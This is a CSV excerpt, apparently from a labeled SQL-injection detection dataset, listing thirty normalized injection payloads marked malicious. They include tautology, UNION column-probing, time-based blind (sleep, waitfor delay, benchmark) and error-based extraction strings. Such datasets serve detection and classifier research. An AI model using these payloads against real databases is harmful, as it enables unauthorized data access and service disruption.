row_index,payload_norm,label,sqli_type_hint
3210,"-1048%"" or 3038 = 3038",1,
3211,"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
3212,"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--",1,
3213,select ( case when ( 6839 = 2730 ) then 6839 else 6839* ( select 6839 from mysql.db ) end ) #,1,
3214,"1"" ) where 9499 = 9499",1,
3215,"1%' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",1,
3216,"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw",1,
3217,select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --,1,
3218,"1 ) union all select null,null,null,null#",1,
3219,-4384' ) ) ) or 6872 = 6872 and ( ( ( 'ukhl' = 'ukhl,1,
3220,"1'+ ( select qmez where 3729 = 3729 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
3221,"1"" ) ) union all select null,null,null,null,null,null,null--",1,
3222,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'sucj' = 'sucj",1,
3223,"1 union all select null,null,null,null,null,null--",1,
3224,"1 ) ) as dhge where 4816 = 4816 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
3225,"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""ynde"" = ""ynde",1,
3226,"select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--",1,
3227,1'|| ( select 'blvu' from dual where 9813 = 9813,1,
3228,"1, ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )",1,
3229,"1' and elt ( 4249 = 4249,7259 ) and 'pgvz' = 'pgvz",1,
3230,-1304' ) union all select 7639#,1,
3231,select ( case when ( 3681 = 5026 ) then 3681 else 3681* ( select 3681 from information_schema.character_sets ) end ) #,1,
3232,"-8612"" ) or 4043 = 3083 and ( ""pjzo"" like ""pjzo",1,
3233,"-5780 or make_set ( 3464 = 4518,4518 ) -- icit",1,
3234,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'wweo' = 'wweo",1,
3235,"1' in boolean mode ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
3236,-9148 ) where 2027 = 2027 or 8571 = 8571--,1,
3237,1 ) ) as somz where 1598 = 1598,1,
3238,"end and ( ( ( ""poee"" = ""poee",1,
3239,-3849 ) or 5580 = 3442--,1,
